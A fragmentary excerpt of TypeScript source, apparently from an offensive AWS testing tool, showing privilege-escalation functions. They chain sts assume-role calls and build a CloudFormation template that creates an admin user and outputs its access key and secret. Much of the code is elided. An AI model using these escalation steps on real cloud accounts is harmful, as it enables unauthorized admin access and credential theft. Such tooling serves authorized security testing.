...
export async function iamPrivesc(args: string[], timeout: number): Promise<HookResult> {
  ...
  if (method === "assumerole") {
    ...
    const r = await aws(
      ["sts", "assume-role", "--role-arn", roleArn, "--role-session-name", "mergen"],
      profile,
      region,
      timeout,
    )
...
export async function roleChain(args: string[], timeout: number): Promise<HookResult> {
  ...
  for (let i = 0; i < roles.length; i++) {
    ...
    const cmdArgs = ["sts", "assume-role", "--role-arn", roleArn, "--role-session-name", `mergen-hop${i + 1}`]
...
export async function gluePrivesc(args: string[], timeout: number): Promise<HookResult> {
  ...
  const scriptPath = `s3://mergen-temp-${Date.now()}/glue-privesc.py`
  ...
  const template = JSON.stringify({
    ...
    Resources: {
      ...
      MergenKey: {
        ...
        Properties: { UserName: { Ref: "MergenAdmin" } },
      },
    },
    Outputs: {
      AccessKeyId: { Value: { Ref: "MergenKey" } },
      SecretAccessKey: { Value: { "Fn::GetAtt": ["MergenKey", "SecretAccessKey"] } },
    },
  })
